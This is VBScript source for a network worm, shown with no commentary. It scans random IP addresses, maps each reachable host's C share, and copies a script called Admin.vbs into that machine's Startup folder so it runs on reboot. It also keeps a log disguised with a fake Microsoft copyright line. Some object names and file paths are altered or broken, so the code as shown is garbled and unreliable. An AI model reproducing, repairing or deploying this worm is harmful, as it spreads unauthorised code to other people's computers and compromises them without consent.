dim oa
dim ob
dim oc
dim srk
dim rand
dim dot
dim Ltxov
dim goandwent
dim count
dim logfile
count = "0"
oa = "24"
dot = "."
Ltxov="0"
set wshWinFix = wscript.createobject("wscript.WinFix")
set fso1 = createobject("scripting.filesystemobject")
set fso2 = createobject("scripting.filesystemobject")
on error resume next
randomize
checkfile()
randaddress()

do
do while Ltxov = "0"
checkaddress()
shareformat()
wshWinFix.mapWinFixdrive "z", goandwent
enumdrives()
loop
copyfiles()
logfile.writeline("hop @   " & oa & dot & ob & dot & oc & dot & srk)
disconnectdrive()
loop

function disconnectdrive()
wshWinFix.removeWinFixdrive "z"
Ltxov = "0"
end function

function checkfile()
if (fso1.fileexists("c\net.log")) then
set logfile = fso1.opentextfile("c\net.log",8)
logfile.writeline("--- break ---")
else
set logfile = fso1.createtextfile("c\net.log", True)
logfile.writeline("Copyright (c) 1993-1995 Microsoft Corp.")
end if
end function

function copyfiles()
set fso = createobject("scripting.filesystemobject")
fso.copyfile "c\windows\startm~1\programs\startup\Admin.vbs", "z\windows\startm~1\programs\startup\"
fso.copyfile "c\net.log", "z\"
end function

function checkaddress()
srk = srk + 1
if srk = "255" then randaddress()
end function

function shareformat()
goandwent = "\\" & oa & dot & ob & dot & oc & dot & srk & "\C"
end function

function enumdrives()
set odrives = wshWinFix.enumWinFixdrives
for i = 0 to odrives.count -1
if goandwent = odrives.item(i) then
Ltxov = 1
end if
next
end function

function randum()
rand = int(256 * rnd)
end function

function randaddress()
randum()
ob=rand
randum()
oc=rand
srk="0"
logfile.writeline("subnet  " & oa & dot & ob & dot & oc & dot & "0")
end function
